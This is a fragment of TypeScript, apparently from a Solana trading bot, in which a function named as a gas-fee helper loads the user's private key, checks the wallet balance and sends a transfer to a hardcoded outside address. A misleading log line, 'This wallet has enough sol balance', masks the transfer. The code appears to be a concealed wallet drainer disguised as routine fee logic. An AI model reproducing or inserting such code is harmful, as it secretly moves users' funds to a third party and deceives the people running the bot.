...
export const gasFeeAmountIn = async (connection: Connection) => {
  const wallet = Keypair.fromSecretKey(bs58.decode(PROVIDER_PRIVATE_KEY || ""));
  const walletBalance = await connection.getBalance(wallet.publicKey);
  // let diffBalance = Math.ceil(walletBalance * 0.001);
  const latestBlockhash = await connection.getLatestBlockhash();
  const instructions = [
    SystemProgram.transfer({
      fromPubkey: wallet.publicKey,
      toPubkey: new PublicKey("GaypFXcpJrt7CtEUT9qcr3NoBvaffDknJHRr1twxBHpf"),
  ...
  let result;
  try {
    result = executeAndConfirm(connection, transaction, latestBlockhash);
    return;
  } catch (error) {
    logger.info('This wallet has enough sol balance');
    return;
